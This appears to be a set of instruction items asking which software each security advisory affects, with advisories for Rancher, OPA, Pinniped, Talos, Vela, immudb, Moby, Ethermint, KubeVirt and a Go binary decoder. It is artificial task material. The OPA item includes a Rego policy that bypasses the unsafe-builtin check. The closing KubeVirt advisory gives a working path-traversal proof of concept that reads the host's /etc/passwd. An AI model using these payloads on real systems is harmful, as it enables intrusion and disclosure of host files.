`Cluster.Spec.RancherKubernetesEngineConfig.BackupConfig.S3BackupConfig.SecretKey`\n- `Cluster.Spec.RancherKubernetesEngineConfig.PrivateRegistries.Password`\n- `Cluster.Spec.RancherKubernetesEngineConfig.Network.WeaveNetworkProvider.Password`\n- `Cluster.Spec.RancherKubernetesEngineConfig.CloudProvider.VsphereCloudProvider.Global.Password`\n- `Cluster.Spec.RancherKubernetesEngineConfig.CloudProvider.VsphereCloudProvider.VirtualCenter.Password`\n- `Cluster.Spec.RancherKubernetesEngineConfig.CloudProvider.OpenstackCloudProvider.Global.Password`\n- `Cluster.Spec.RancherKubernetesEngineConfig.CloudProvider.AzureCloudProvider.AADClientSecret`\n- `Cluster.Spec.RancherKubernetesEngineConfig.CloudProvider.AzureCloudProvider.AADClientCertPassword`\n- `Cluster.Status.ServiceAccountToken`\n- `ClusterTemplate.Spec.ClusterConfig.RancherKubernetesEngineConfig.PrivateRegistries.Password`\n- `ClusterTemplate.Spec.ClusterConfig.RancherKubernetesEngineConfig.Network.WeaveNetworkProvider.Password`\n- `ClusterTemplate.Spec.ClusterConfig.RancherKubernetesEngineConfig.CloudProvider.VsphereCloudProvider.Global.Password`\n- `ClusterTemplate.Spec.ClusterConfig.RancherKubernetesEngineConfig.CloudProvider.VsphereCloudProvider.VirtualCenter.Password`\n- `ClusterTemplate.Spec.ClusterConfig.RancherKubernetesEngineConfig.CloudProvider.OpenstackCloudProvider.Global.Password`\n- `ClusterTemplate.Spec.ClusterConfig.RancherKubernetesEngineConfig.CloudProvider.AzureCloudProvider.AADClientSecret`\n- `ClusterTemplate.Spec.ClusterConfig.RancherKubernetesEngineConfig.CloudProvider.AzureCloudProvider.AADClientCertPassword`\n\n### Patches\nPatched versions include releases 2.5.16, 2.6.7 and later versions.\n\nAfter upgrading to a patched version, it is important to check for the `SecretsMigrated` condition on `Clusters`, `ClusterTemplates`, and `Catalogs` to confirm when secrets have been fully migrated off of those objects and the objects scoped within them (`Notifiers` and `SourceCodeProviderConfigs`).\n\n### Workarounds\nLimit access in Rancher to trusted users. There is not a direct mitigation besides upgrading to the patched Rancher versions.\n\n**Important:**\n- It is highly advised to rotate Rancher's `serviceAccountToken`. This rotation is not done by the version upgrade. Please see the helper script below.\n- The local and downstream clusters should be checked for potential unrecognized services (pods), users and API keys.\n- It is recommended to review for potential leaked credentials in this scenario, that are not directly related to Rancher, and to change them if deemed necessary.\n\nThe script available in [rancherlabs/support-tools/rotate-tokens](https://github.com/rancherlabs/support-tools/blob/master/rotate-tokens) repository can be used as a helper to rotate the service account token (used to provision clusters). The script requires a valid Rancher API token, `kubectl` access to the `local` cluster and the `jq` command.\n\n### Credits\nWe would like to recognize and appreciate Florian Struck (from [Continum AG](https://www.continum.net/)) and [Marco Stuurman](https://github.com/fe-ax) (from [Shock Media B.V.](https://www.shockmedia.nl)) for the responsible disclosure of this security issue.\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Reach out to [SUSE Rancher Security team](https://github.com/rancher/rancher/security/policy) for security related inquiries.\n* Open an issue in [Rancher](https://github.com/rancher/rancher/issues/new/choose) repository.\n* Verify our [support matrix](https://www.suse.com/suse-rancher/support-matrix/all-supported-versions/) and [product support lifecycle](https://www.suse.com/lifecycle/)..

Please identify the software name affected by it. Input: ### Impact\n> _What kind of vulnerability is it? Who is impacted?_\n\nThe vulnerability is a memory allocation vulnerability that can be exploited to allocate slices in memory with (arbitrary) excessive size value, which can either exhaust available memory or crash the whole program.\n\nWhen using `github.com/gagliardetto/binary` to parse unchecked (or wrong type of) data from untrusted sources of input (e.g. the blockchain) into slices, it's possible to allocate memory with excessive size.\n\nWhen `dec.Decode(&val)` method is used to parse data into a structure that is or contains slices of values, the length of the slice was previously read directly from the data itself without any checks on the size of it, and then a slice was allocated. This could lead to an overflow and an allocation of memory with excessive size value.\n\nExample:\n\n```go\npackage main\n\nimport (\n\t\"github.com/gagliardetto/binary\" // any version before v0.7.1 is vulnerable\n\t\"log\"\n)\n\ntype MyStruct struct {\n\tField1 []byte // field is a slice (could be a slice of any type)\n}\n\nfunc main() {\n\t// Let's assume that the data is coming from the blockchain:\n\tdata := []byte{0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x0e, 0x0f, 0x10}\n\t\n\tvar val MyStruct\n\t// - To determine the size of the val.Field1 slice, the decoder will read the length\n\t//   of the slice from the data itself without any checks on the size of it.\n\t//\n\t// - This could lead to an allocation of memory with excessive size value.\n\t//   Which means: []byte{0x01, 0x02, 0x03, 0x04} will be read as the length\n\t//   of the slice (= 67305985) and then an allocation of memory with 67305985 bytes will be made.\n\t//\n\tdec := binary.NewBorshDecoder(data)\n\terr := dec.Decode(&val)  // or binary.UnmarshalBorsh(&val, data) or binary.UnmarshalBin(&val, data) etc.\n\tif err != nil {\n\t\tlog.Fatal(err)\n\t}\n}\n```\n\n### Patches\n> _Has the problem been patched? What versions should users upgrade to?_\n\nThe vulnerability has been patched in `github.com/gagliardetto/binary` `v0.7.1`\n\nUsers should upgrade to `v0.7.1` or higher.\n\nTo upgrade to `v0.7.1` or higher, run:\n\n```bash\ngo get github.com/gagliardetto/binary@v0.7.1\n\n# or\n\ngo get github.com/gagliardetto/binary@latest\n```\n\n### Workarounds\n> _Is there a way for users to fix or remediate the vulnerability without upgrading?_\n\nA workaround is not to rely on the `dec.Decode(&val)` function to parse the data, but to use a custom `UnmarshalWithDecoder()` method that reads and checks the length of any slice.\n\n### References\n> _Are there any links users can visit to find out more?_\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in [github.com/gagliardetto/binary](https://github.com/gagliardetto/binary)\n* DM me on [twitter](https://twitter.com/immaterial_ink)\n.

Please identify the software name affected by it. Input: ### Impact\n\nThe Rego compiler provides a (deprecated) `WithUnsafeBuiltins` function, which allows users to provide a set of built-in functions that should be deemed unsafe \u2014 and as such rejected \u2014 by the compiler if encountered in the policy compilation stage. A bypass of this protection has been found, where the use of the `with` keyword to mock such a built-in function (a feature introduced in OPA v0.40.0), isn\u2019t taken into account by `WithUnsafeBuiltins`.\n\nThe same method is exposed via `rego.UnsafeBuiltins` in the `github.com/open-policy-agent/opa/rego` package.\n\nWhen provided e.g. the `http.send` built-in function to `WithUnsafeBuiltins`, the following policy would still compile, and call the `http.send` function with the arguments provided to the `is_object` function when evaluated:\n\n```rego\npackage policy\n\nfoo := is_object({\n    \"method\": \"get\", \n    \"url\": \"https://www.openpolicyagent.org\"\n})\n\nallow := r {\n    r := foo with is_object as http.send\n}\n```\n\nBoth built-in functions and user provided (i.e. custom) functions are mockable using this construct.\n\nIn addition to `http.send`, the `opa.runtime` built-in function is commonly considered unsafe in integrations where policy provided by untrusted parties is evaluated, as it risks exposing configuration, or environment variables, potentially carrying sensitive information.\n\n#### Affected Users\n\n**All of these conditions have to be met** to create an adverse effect:\n\n* Use the Go API for policy evaluation (not the OPA server, or the Go SDK)\n* Make use of the `WithUnsafeBuiltins` method in order to deny certain built-in functions, like e.g. `http.send`, from being used in policy evaluation.\n* Allow policy evaluation of policies provided by untrusted parties.\n* The policies evaluated include the `with` keyword to rewrite/mock a built-in, or custom, function to that of another built-in function, such as `http.send`.\n\n**Additionally, the OPA Query API** is affected:\n* If the OPA [Query API](https://www.openpolicyagent.org/docs/latest/rest-api/#query-api) is exposed to the public, and it is relied on `http.send` to be unavailable in that context. Exposing the OPA API to the public without proper [authentication and authorization](https://www.openpolicyagent.org/docs/latest/security/#authentication-and-authorization) in place is generally advised against.\n\n### Patches\nv0.43.1, v0.44.0\n\n### Workarounds\n\nThe `WithUnsafeBuiltins`  function has been considered deprecated since the introduction of the [capabilities](https://www.openpolicyagent.org/docs/latest/deployments/#capabilities) feature in OPA v0.23.0 . While the function was commented as deprecated, the format of the comment was however not following the [convention](https://zchee.github.io/golang-wiki/Deprecated/) for deprecated functions, and might not have been picked up by tooling like editors. This has now been fixed. Users are still encouraged to use the capabilities feature over the deprecated `WithUnsafeBuiltins` function.\n\n**If you cannot upgrade**, consider using capabilities instead:\n\nCode like this using the `github.com/open-policy-agent/opa/ast` package:\n```go\n// VULNERABLE with OPA <= 0.43.0\nunsafeBuiltins := map[string]struct{}{\n\tast.HTTPSend.Name: struct{}{},\n}\ncompiler := ast.NewCompiler().WithUnsafeBuiltins(unsafeBuiltins)\n```\n\nneeds to be changed to this:\n```go\ncaps := ast.CapabilitiesForThisVersion()\nvar j int\nfor i, bi := range caps.Builtins {\n\tif bi.Name == ast.HTTPSend.Name {\n\t\tj = i\n\t\tbreak\n\t}\n}\ncaps.Builtins[j] = caps.Builtins[len(caps.Builtins)-1] // put last element into position j\ncaps.Builtins = caps.Builtins[:len(caps.Builtins)-1]   // truncate slice\n\ncompiler := ast.NewCompiler().WithCapabilities(caps)\n```\n\nWhen using the `github.com/open-policy-agent/opa/rego` package:\n\n```go\n// VULNERABLE with OPA <= 0.43.0\nr := rego.New(\n\t// other options omitted\n\trego.UnsafeBuiltins(map[string]struct{}{ast.HTTPSend.Name: struct{}{}}),\n)\n```\n\nneeds to be changed to\n```go\nr := rego.New(\n\t// other options omitted\n\trego.Capabilities(caps),\n)\n```\nwith `caps` defined above.\n\nNote that in the process, some error messages will change: `http.send` in this example will no longer be \"unsafe\" and thus forbidden, but it will simply become an \"unknown function\".\n\n### References\n\n* Fix commit on `main`: https://github.com/open-policy-agent/opa/commit/25a597bc3f4985162e7f65f9c36599f4f8f55823\n* Fix commit in 0.43.1 release: https://github.com/open-policy-agent/opa/commit/3e8c754ed007b22393cf65e48751ad9f6457fee8, release page for 0.43.1: https://github.com/open-policy-agent/opa/releases/tag/v0.43.1\n* Function mocking feature introduced in https://github.com/open-policy-agent/opa/pull/4540 and https://github.com/open-policy-agent/opa/pull/4616 \n* Documentation on the [capabilities](https://www.openpolicyagent.org/docs/latest/deployments/#capabilities) feature, which is the preferred way of providing a list of allowed built-in functions.

Please identify the software name affected by it. Input: ### Impact\n\nA user authenticating to Kubernetes clusters via the Pinniped Supervisor could potentially use their access token to continue their session beyond what proper use of their refresh token might allow.\n\nAccess tokens issued by the Pinniped Supervisor have an intended expiration lifetime of approximately two minutes. The Pinniped CLI will automatically use the refresh token, which has a lifetime of approximately nine hours, to request a new access token after the access token's advertised expiration time elapses. Starting in Pinniped version 0.13.0, the Supervisor performs checks during each refresh request against the configured external identity provider to determine if the user should be allowed to continue their session. Thus, the short lifetime of the access token is intended to force users to be subjected to those checks often. For example, if a user's account in the external identity provider became locked, the next refresh would fail, and the user should lose access to the Kubernetes clusters fairly quickly. As another example, if a user's group membership changed in the external identity provider, the new group memberships would be reflected in their sessions with Kubernetes clusters within a fairly short window of time.\n\nAccess tokens are cached in a local file by the Pinniped CLI (the kubectl plugin) and are sent back to the Supervisor (via HTTPS) to receive cluster-scoped credentials. Due to a bug in this token exchange, the expiration time of the submitted access token was not checked correctly, causing expired access tokens to continue to be accepted by this endpoint until the user's backend session data is deleted, approximately nine hours after their session started. This bug could allow a legitimate user to avoid the checks performed during refresh by maliciously skipping the refresh step.\n\nNote that the Pinniped CLI performs the refresh operation often, so the refresh checks are still performed often under normal usage of the CLI, despite this bug.\n\nPractical impact to versions before v0.13.0 is minimal, since those versions did not perform checks against the external identity provider during refreshes. In these versions, the user can perform refreshes to get a new access tokens without restriction for approximately nine hours, so the duration of their access is effectively unchanged by this bug.\n\n### Patches\n\nThe impacted token exchange feature was first introduced in v0.3.0. Versions v0.3.0 to v0.18.0 are effected by this bug.\n\nThis vulnerability was found by the maintainers of Pinniped and fixed immediately. The fix was introduced in release v0.19.0.\n\n### Workarounds\n\nThere are no known workarounds. Upgrading the Supervisor is recommended, especially for users of v0.13.0 or newer.\n\n### References\n\nThe issue was fixed by PR [#1264](https://github.com/vmware-tanzu/pinniped/pull/1264).\n\n### For more information\n\nIf you have any questions or comments about this advisory, please reach out to the maintainers using one of the methods described in this repo's [README.md](https://github.com/vmware-tanzu/pinniped/blob/main/README.md#discussion).\n.

Please identify the software name affected by it. Input: ### Impact\n\nTalos worker nodes use a join token to get accepted into the Talos cluster. A misconfigured Kubernetes environment may allow workloads to access the join token of the worker node. A malicious workload could then use the join token to construct a Talos CSR (certificate signing request). Due to improper validation while signing a worker node CSR, a Talos control plane node might issue a Talos certificate which allows full access to the Talos API to a worker node that presented a maliciously constructed CSR. Accessing the Talos API with full access on a control plane node might reveal sensitive information, which could allow full-level access to the cluster (Kubernetes and Talos PKI, etc.)\n\nIn order to exploit the weakness, a Kubernetes workload would need to access the join token, and then construct a specific kind of Talos CSR in order to obtain a privileged certificate. The Talos API join token is stored in the machine configuration on the worker node. When configured correctly, Kubernetes workloads do not have access to the machine configuration, and thus cannot access the token, nor acquire elevated privileges.\n\nIt is possible that users have misconfigured Kubernetes in such a way as to allow a workload to access the machine configuration and reveal the join token.  Misconfigurations that may allow the machine configuration to be accessed on a worker node by the Kubernetes workload are:\n\n* allowing a `hostPath` mount to mount the machine config directly from the host filesystem (`hostPath` mounts should not be allowed for untrusted workloads, and are disabled by default in recent versions of Talos.)\n* reading machine configuration from a cloud metadata server from Kubernetes pods with host networking (on cloud platforms, when machine config is stored in the cloud metadata server, and the cloud metadata server doesn't provide enough protection to prevent access from non-host workloads)\n\n### Patches\n\nThe problem was fixed in Talos 1.2.2.\n\n### Workarounds\n\nEnabling the [Pod Security Standards](https://www.talos.dev/v1.2/kubernetes-guides/configuration/pod-security/)  mitigates the vulnerability by denying `hostPath` mounts and host networking by default in the [baseline](https://kubernetes.io/docs/concepts/security/pod-security-standards/#baseline) policy. Talos enables Pod Security Admission plugin by default since [Talos v1.1.0](https://www.talos.dev/v1.1/introduction/what-is-new/#pod-security-admission).\n\nClusters that don't run untrusted workloads are not affected.\nClusters with correct Pod Security configurations which don't allow `hostPath` mounts, and secure access to cloud metadata server (or machine configuration is not supplied via cloud metadata server) are not affected.\n\n### References\n\n* [Talos v1.2.2 release](https://github.com/siderolabs/talos/releases/tag/v1.2.2)\n* [Fixing commit](https://github.com/siderolabs/talos/commit/9eaf33f3f274e746ca1b442c0a1a0dae0cec088f)\n\n### For more information\n\nIf you have any questions or comments about this advisory:\n\n* Email us at [security@siderolabs.com](mailto:security@siderolabs.com)\n.

Please identify the software name affected by it. Input: ### Impact\nSome current default configurations for Vela allow exploitation and container breakouts.\n\n#### Default Privileged Images\n\nRunning Vela plugins as privileged Docker containers allows a malicious user to easily break out of the container and gain access to the worker host operating system. On a fresh install of Vela without any additional configuration, the `target/vela-docker` plugin will run as a privileged container, even if the Vela administrators did not intend to allow for any privileged plugins, and even if the `vela.yml` configuration file does not use the `privileged = True` flag.\n\nPrivileged containers permit trivial breakouts, which can pose significant risk to the environment in which Vela is running.\n\n#### Default Allowed Repositories\n\nOn a fresh install of Vela, anyone with a GitHub account (or other enabled source control management solution) is allowed to enable a repository within Vela and run builds. This means that, if a Vela instance is accessible to the public, a third party could add their own malicious repos to the Vela instance and run arbitrary code.\n\nAn example of a publicly accessible Vela instance would be one not protected behind a VPN. Whether Vela is publicly accessible depends on how Vela is set up, NOT how it is connected to GitHub.\n\n#### Default Enabled Events allows Pull Requests\n\nBy default, Vela currently enables pull request events when a repository is Vela-enabled. Unless this default was changed when enabling each repository, anyone who can issue a pull request against a repository can trigger a Vela job.\n\nThis not only permits a third party to run arbitrary code in a Vela environment, but also poses an additional risk when secrets within Vela are configured to be available in pull requests, permitting anyone with access to create pull requests to access these secrets.\n\n### Patches\n\nUpgrade to 0.16.0 or later. After upgrading, Vela administrators will need to explicitly change the default settings to configure Vela as desired.\n\nSome of the fixes will interrupt existing workflows and will require Vela administrators to modify default settings (see release notes for more information). However, not applying the patch (or workarounds) will continue existing risk exposure.\n\n### Workarounds\n\n#### Default Privileged Images\n\nInstead of upgrading, the Vela administrators can adjust the worker's `VELA_RUNTIME_PRIVILEGED_IMAGES` setting to be explicitly empty:\n\n`VELA_RUNTIME_PRIVILEGED_IMAGES=\"\"`\n\nBy assigning `VELA_RUNTIME_PRIVILEGED_IMAGES` to an empty value it disallows any images from running as privileged containers in Vela.\n\n#### Default Allowed Repositories\n\nInstead of upgrading, the Vela administrators can leverage the `VELA_REPO_ALLOWLIST` setting on the server component to restrict access to a list of repositories that are allowed to be enabled.\n\nBy changing it from the default empty list (currently interpreted by Vela as \"all repositories\") to a list explicitly allowing specific repositories, Vela administrators can control what repositories are allowed to be enabled in Vela.\n\nVela's current default list of approved repositories that can be added to a Vela instance is an empty list. However this is currently interpreted as allowing all repositories.\n\nIn the updated version, a null value (the empty list) will be interpreted as permitting no repositories to be added to a Vela instance.\n\n#### Default Enabled Events allows Pull Requests\n\nAudit enabled repositories and disable `pull_requests` if they are not needed.\n\nInstead of upgrading, the pull request trigger can be disabled on a per-repository basis.\n\nAdditional protection can be provided by preventing unauthorized users from submitting pull requests in GitHub (or other source control management solution).\n\n### Residual Risk\n\n#### Default Privileged Images\n\nAfter applying the update, any repos that Vela administrators manually define as \"trusted repos\" will be able to run the manually-specified images that are allowed to run as privileged. Those repos will continue to be vulnerable to breakout, but applying the update will help protect against the risk of trivial breakout arising from an image running as a privileged container.\n\nThe recommendation is to utilize plugins that do not require privileged capabilities.\n\nFor example, utilize `target/vela-kaniko` instead of `target/vela-docker` as the Kaniko plugin does not require privileged access.\n\n#### Default Allowed Repositories\n\nApplying this update (or workaround) will protect against the risk of Vela interpreting the default empty list of approved repositories as \"all repositories\" rather than \"no repositories\" (the current default).\n\n#### Default Enabled Events allows Pull Requests\n\nSince this change only impacts newly enabled repositories, the update will not address the risk to existing enabled repositories resulting from Vela enabling pull request events when a repository is Vela-enabled.\n\nAdditionally, this change only impacts defaults; users can still configure their repositories to allow pull requests as triggering events.\n\nIn order to monitor risk going forward, refer to the `Workaround` section with the heading `Default Enabled Events allows Pull Requests`.\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Email us at [vela@target.com](mailto:vela@target.com)\n\nAffected products: `go-vela/worker`, `go-vela/server`, `go-vela/ui`, `go-vela/documentation`.

Input: ### Impact\n\nIn certain scenario a malicious immudb server can provide a falsified proof that will be accepted by the client SDK signing a falsified transaction replacing the genuine one. This situation can not be triggered by a genuine immudb server and requires the client to perform a specific list of verified operations resulting in acceptance of an invalid state value.\n\nThis vulnerability only affects immudb client SDKs, the immudb server itself is not affected by this vulnerability.\n\n### Detailed description\n\nimmudb uses Merkle Tree enhanced with additional linear part to perform consistency proofs between two transactions. The linear part is built from the last leaf node of the Merkle Tree compensating for transactions that were not yet consumed by the Merkle Tree calculation.\n\nThe Merkle Tree part is then used to perform proofs for things that are in transaction range covered by the Merkle Tree where the linear part is used to check those that are not yet in the Merkle Tree.\n\nWhen doing consistency checks between two immudb states, the linear proof part is not fully checked. In fact only the first (last Merkle Tree leaf) and the last (current DB state value) are checked against new Merkle Tree without ensuring that elements in the middle of that chain are correctly added as Merkle Tree leafs.\n\nThis lack of check means that the database can present different set of hashes on the linear proof part to what would later be used once those become part of the Merkle Tree. This property can be exploited by the database to expose two different transaction entries depending on the other transaction that the user requested consistency proof for.\n\nIn practice this could lead to a following scenario:\n\n* a client requests a verified write operation\n* the server responds with a proof for the transaction\n* client stores the state value retrieved from the server and expects it to be a confirmation of that write and all the history of the database before that transaction\n* a series of validated read / write operations is performed by the client, each accompanied by a successfully validated consistency proof and update of the client state\n* the client requests verified get operation on the transaction it has written before (and that was verified with a proof from the server)\n* the server replies with a completely different transaction that can be properly validated according to the currently stored db state on the client side\n\n### Patches\n\nThe following Go SDK versions is not vulnerable:\n\n| **SDK** | **Version** |\n|-------|------------|\n| [go](pkg.go.dev/github.com/codenotary/immudb/pkg/client) | 1.4.1 |\n\n### Workarounds\n\nInvalid proofs can not be generated in a normal immudb server and will be detected by a genuine replica server.\nTo ensure that the server does not produce invalid proofs and to check that the history presented by the server\ndoes not contain falsified transactions, one should run a genuine immudb replica server in a safe environment\nand fully synchronize all databases with the primary.\n\n### References\n\n* https://github.com/codenotary/immudb/tree/master/docs/security/vulnerabilities/linear-fake\n\n### For more information\n\nIf you have any questions or comments about this advisory:\n\n* Open a discussion in [immudb Discussions](https://github.com/codenotary/immudb/discussions/new)\n* Email us at [immudb-security@codenotary.com](mailto:immudb-security@codenotary.com)\n.

Please identify the software name affected by it. Input: ### Description\n\nMoby is the open source Linux container runtime and set of components used to build a variety of downstream container runtimes, including Docker CE, Mirantis Container Runtime (formerly Docker EE), and Docker Desktop. Moby allows for building container images using a set of build instructions (usually named and referred to as a \"Dockerfile\"), and a build context, which is not unlike the CWD in which the Dockerfile instructions are executed.\n\nContainers may be built using a variety of tools and build backends available in the Moby ecosystem; in all cases, builds may not include files outside of the build context (such as using absolute or relative-parent paths). This is enforced through both checks in the build backends, and the containerization of the build process itself.\n\nVersions of Git where CVE-2022-39253 is present and exploited by a malicious repository, when used in combination with Moby, are subject to an unexpected inclusion of arbitrary filesystem paths in the build context, without any visible warning to the user.\n\nThis issue was originally reported by Wenxiang Qian of Tencent Blade Team, and the root-cause analysis was performed by Cory Snider of Mirantis, with assistance from Bjorn Neergaard of the same. The issue was then reported to the Git project, and Taylor Blau led the process resolving the root issue in Git.\n\n### Impact\n\nThis vulnerability originates in Git, but can be used to violate assumptions that may have security implications for users of Moby and related components. Users may rely on the fact that a build context ensures that outside files cannot be referenced or incorporated using multiple enforcement mechanisms, or expect a warning if this does not hold true. A maliciously crafted Git repository exploiting CVE-2022-39253 can violate this assumption, and potentially include sensitive files that are subsequently uploaded to a container image repository, or disclosed by code inside the resulting container image.\n\nAs this issue cannot be triggered remotely, except by users who already have full control over the daemon through the API, and it requires exploiting a vulnerability in Git by convincing a user to build a maliciously crafted repository, the impact in Moby is considered low.\n\n### Patches\n\nMoby 20.10.20, and Mirantis Container Runtime (formerly Docker Enterprise Edition) 20.10.14 will contain mitigations for CVE-2022-39253 when a Git clone is performed by Moby components (on either the daemon or API client side). However, as these mitigations only apply to certain scenarios (build of `git+<protocol>://...` URL contexts) and cannot protect against a malicious repository already on disk, users should update to a version of Git containing patches for CVE-2022-39253 on all their systems running both API clients and daemons.\n\nSpecifically, patches in Moby (including patches incorporated from BuildKit) protect against the following:\n\n* `docker build` with the legacy builder (e.g. `DOCKER_BUILDKIT` unset or set to 0) of a Git URL context. Note that depending on available API versions and the CLI version, the Git clone operation can take place on either the client or the daemon side. Both must be updated (or have Git updated) to fully protect this build method.\n* `docker build` with the BuildKit builder (e.g. `DOCKER_BUILDKIT=1`) of a Git URL context.\n* `docker buildx build` with `BUILDKIT_CONTEXT_KEEP_GIT_DIR=1` of a Git URL context.\n\nPatches in BuildKit incorporated into Docker Compose protect against CVE-2022-39253 during Compose-driven builds of Git URL contexts.\n\nPatches in Moby and related projects such as BuildKit, the Docker CLI, and Docker Compose **cannot** fully protect against CVE-2022-39253, as it may be triggered by a malicious repository already on disk that a unpatched Git client has interacted with (specifically, commands that check out submodules such as `git clone --recursive`, `git submodule update`, etc.  may have already triggered the Git vulnerability).\n\n### Workarounds\n\nWhile this behavior is unexpected and undesirable, and has resulted in this security advisory, users should keep in mind that building a container entails arbitrary code execution. Users should not build a repository/build context they do not trust, as containerization cannot protect against all possible attacks.\n\nWhen building with BuildKit (e.g. `docker buildx build` or `docker build` with `DOCKER_BUILDKIT=1`), this issue cannot be exploited unless `--build-arg BUILDKIT_CONTEXT_KEEP_GIT_DIR=1` was also passed, as by default BuildKit will discard the `.git` directory of a Git URL context immediately after cloning and checking out the repository.\n\n### For more information\n\nIf you have any questions or comments about this advisory:\n\n* [Open an issue](https://github.com/moby/moby/issues/new)\n* Email us at [security@docker.com](mailto:security@docker.com).

Input: # Vulnerability Report\n\n## Impact\n\nSmart contract applications that make use of the `selfdestruct` functionality and their end-users.\n\n## Classification\n\nThe vulnerability has been classified as `high` with a CVSS score of `8.2`. It has the potential to create a denial-of-service to all contracts that can invoke the [`selfdestruct`](https://ethereum.stackexchange.com/questions/315/why-are-selfdestructs-used-in-contract-programming#347) function to destroy a smart contract. \n\n## Users Impacted\n\nDue to the successfully coordinated security vulnerability disclosure, no smart contracts were impacted through the use of this vulnerability. Smart contract states and storage values are not affected by this vulnerability. User funds and balances are safe.\n\n## Disclosure\n\nIn Ethermint running versions before `v0.17.2`, the contract `selfdestruct` invocation permanently removes the corresponding bytecode from the internal database storage. However, due to a bug in the [`DeleteAccount`](https://github.com/evmos/ethermint/blob/c9d42d667b753147977a725e98ed116c933c76cb/x/evm/keeper/statedb.go#L199-L203) function, all contracts that used the identical bytecode (i.e shared the same `CodeHash`) will also stop working once one contract invokes `selfdestruct`, even though the other contracts did not invoke the `selfdestruct` OPCODE.\n\n### Additional Details\n\nThe same contract bytecode can be deployed multiple times to create multiple contract instances. In the internal database, the bytecode is stored as a key-value entry `bytecode hash --> bytecode` which is shared by those contracts. Unfortunately, when one of the contracts invokes `selfdestruct`, it will remove the corresponding `bytecode hash -> bytecode` entry, and thus it disables all the contracts that share the same bytecode.\n\nThe attack scenario is as follows:\n\n1. The malicious attacker identifies a vulnerable contract that can invoke `selfdestruct`\n2. The attacker deploys a copy of the contract with identical bytecode\n3. Finally, the attacker triggers the `selfdestruct` operation on their redeployed contract, actively causing a DoS on the original and vulnerable contract. All transactions will fail until a workaround is used (see below).\n\n## Patches\n\n*Has the problem been patched? What versions should users upgrade to?*\n\nThis vulnerability has been patched in Ethermint versions \u2265[v0.18.0](https://github.com/evmos/ethermint/releases/tag/v0.18.0). The patch has state machine-breaking changes for applications using Ethermint so a coordinated upgrade procedure is required.\n\n#### Details\n\nThe patch removes the bytecode deletion logic, i.e. contract bytecodes are never deleted from the internal database after the patch.\nAt the moment, Ethermint does not track how many times each bytecode is used, and thus it cannot determine if it is safe to delete a particular bytecode on `selfdestruct` invocations. This behavior is the same with go-ethereum.\n\n## Workarounds\n\n_Is there a way for users to fix or remediate the vulnerability without upgrading?_\n\nIf a contract is subject to DoS due to this issue, the user can redeploy the same contract, _i.e_ with identical bytecode, so that the original contract's code is recovered.\n\nThe new contract deployment restores the `bytecode hash -> bytecode` entry in the internal state.\n\n## References\n\n*Are there any links users can visit to find out more?*\n\n### For more information\n\nIf you have any questions or comments about this advisory:\n\n- Reach out to the Core Team in [Discord](https://discord.gg/evmos)\n* Open a discussion in [evmos/ethermint](https://github.com/evmos/ethermint/discussions)\n* Email us at [security@evmos.org](mailto:security@evmos.org) for security questions\n* For Press, email us at [evmos@west-comms.com](mailto:evmos@west-comms.com).\n\n### Credits\n\nThanks to the \n\n- Cronos Team: @yihuang and @tomtau for discovering the issue, @gakuzen-crypto, @polycryptics, @FinnZhangCrypto, @wilson-ang, @brianatcrypto for the impact analysis.\n- Evmos Team: @facs95 for patching the issue and @fedekunze for managing the release and coordinating between teams.\n.

This link is maintained to preserve external references.\n\n## Original Description\n\n**Summary**\nAs part of a Kubevirt audit performed by NCC group, a finding dealing with systemic lack of path sanitization which leads to a path traversal was identified.  Google tested the exploitability of the paths in the audit report and identified that when combined with another vulnerability one of the paths leads to an arbitrary file read on the host from the VM.\n\nThe read operations are limited to files which are publicly readable or which are readable for UID 107 or GID 107. /proc/self/<> is not accessible.\n\n**Severity**\n\nModerate - The vulnerability is proven to exist in an open source version of KubeVirt by NCC Group while being combined with Systemic Lack of Path Sanitization, which leads to Path traversal.\n\n**Proof of Concept**\n\nThe initial VMI specifications can be written as such to reproduce the issue:\n\n```\n\napiVersion: kubevirt.io/v1\nkind: VirtualMachineInstance\nmetadata:\n  name: vmi-fedora\nspec:\n  domain:\n    devices:\n      disks:\n      - disk:\n          bus: virtio\n        name: containerdisk\n      - disk:\n          bus: virtio\n        name: cloudinitdisk\n      - disk:\n          bus: virtio\n        name: containerdisk1\n      rng: {}\n    resources:\n      requests:\n        memory: 1024M\n  terminationGracePeriodSeconds: 0\n  volumes:\n  - containerDisk:\n      image: quay.io/kubevirt/cirros-container-disk-demo:v0.52.0\n    name: containerdisk\n  - containerDisk:\n      image: quay.io/kubevirt/cirros-container-disk-demo:v0.52.0\n      path: test3/../../../../../../../../etc/passwd\n    name: containerdisk1\n  - cloudInitNoCloud:\n      userData: |\n        #!/bin/sh\n        echo 'just something to make cirros happy'\n    name: cloudinitdisk\n\n\n```\nThe VMI can then be started through kubectl apply -f vm-test-ncc.yaml.\nThe requested file is accessible once the VM is up and can be accessed under /dev/vdc.\n\nDepending on the environment, path may contain more or less /.., something that can easily be tested by checking the events until the VMI can start without failure.\nRestrictions \n\nSELinux may mitigate this vulnerability.\n\nWhen using a node with selinux, selinux denies the access and the VM start was aborted:\n\n```\n\n19s         Warning   SyncFailed                virtualmachineinstance/vmi-fedora    server error. command SyncVMI failed: \"preparing ephemeral container disk images failed: stat /var/run/kubevirt/container-disks/disk_0.img: permission denied\"\n\ntype=AVC msg=audit(1651828898.296:1266): avc:  denied  { setattr } for  pid=44402 comm=\"rpc-worker\" name=\"passwd\" dev=\"vda1\" ino=691477 scontext=system_u:system_r:virt_launcher.process:s0:c255,c849 tcontext=system_u:object_r:passwd_file_t:s0 tclass=file permissive=1\n\n```\n\nAfter making selinux permissive the VM can boot and access /etc/passwd from the node within the guest:\n\n```\n\n$ sudo cat /dev/vdc\nroot:x:0:0:root:/root:/bin/bash\nbin:x:1:1:bin:/bin:/sbin/nologin\ndaemon:x:2:2:daemon:/sbin:/sbin/nologin\nadm:x:3:4:adm:/var/adm:/sbin/nologin\nlp:x:4:7:lp:/var/spool/lpd:/sbin/nologin\n[...]\n\n```\n\n**Further Analysis**\nIn order to mitigate this vulnerability, Sanitize imagePath in pkg/container-disk/container-disk.go following ISE best practices described and Add checks in pkg/virt-api/webhooks/validating-webhook/admitters/vmi-create-admitter.go\n\n**Timeline**\nDate reported: 05/10/2022\nDate fixed: N/A\nDate disclosed: 